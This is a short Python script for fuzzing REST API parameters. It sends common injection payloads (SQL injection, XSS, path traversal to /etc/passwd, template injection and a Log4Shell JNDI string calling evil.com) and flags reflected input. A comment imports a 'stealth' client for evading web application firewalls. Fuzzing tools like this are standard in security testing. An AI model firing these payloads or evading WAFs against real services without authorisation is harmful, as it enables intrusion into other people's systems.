#!/usr/bin/env python3
"""REST API Fuzzer

Context-aware REST API parameter fuzzing.
"""

from typing import Dict, Any, List, Optional

# Import stealth HTTP client for WAF evasion
try:
    from tools.http_client import safe_get, safe_post, get_stealth_session
    USE_STEALTH = True
except ImportError:
    import requests
    USE_STEALTH = False
    
    def safe_get(url, **kwargs):
        return requests.get(url, **kwargs)
    
    def safe_post(url, **kwargs):
        return requests.post(url, **kwargs)



def discover_parameters(endpoint: str, method: str = "GET", headers: Optional[Dict] = None) -> List[str]:
    """Discover API parameters from endpoint
    
    Args:
        endpoint: API endpoint URL
        method: HTTP method
        headers: Optional headers
        
    Returns:
        List of discovered parameter names
    """
    params = []
    
    # Common parameter names
    common_params = ["id", "user_id", "email", "username", "token", "api_key", "limit", "offset", "sort"]
    
    # Try to extract from URL
    if "?" in endpoint:
        query_string = endpoint.split("?")[1]
        params.extend([p.split("=")[0] for p in query_string.split("&")])
    
    # Add common params
    params.extend(common_params)
    
    return list(set(params))


def fuzz_parameters(endpoint: str, parameters: List[str], headers: Optional[Dict] = None) -> Dict[str, Any]:
    """Fuzz API parameters
    
    Args:
        endpoint: API endpoint URL
        parameters: List of parameters to fuzz
        headers: Optional headers
        
    Returns:
        Dict with fuzzing results
    """
    results = {
        "vulnerable": False,
        "findings": []
    }
    
    # Fuzz payloads
    payloads = [
        "' OR '1'='1",
        "<script>alert(1)</script>",
        "../../etc/passwd",
        "{{7*7}}",
        "${jndi:ldap://evil.com/a}",
    ]
    
    for param in parameters:
        for payload in payloads:
            try:
                resp = safe_get(
                    endpoint,
                    params={param: payload},
                    headers=headers or {},
                    timeout=10
                )
                
                # Check for reflected payload
                if payload in resp.text:
                    results["vulnerable"] = True
                    results["findings"].append({
                        "parameter": param,
                        "payload": payload,
                        "type": "reflected_input",
                        "status_code": resp.status_code
                    })
            except Exception:
                continue
    
    return results

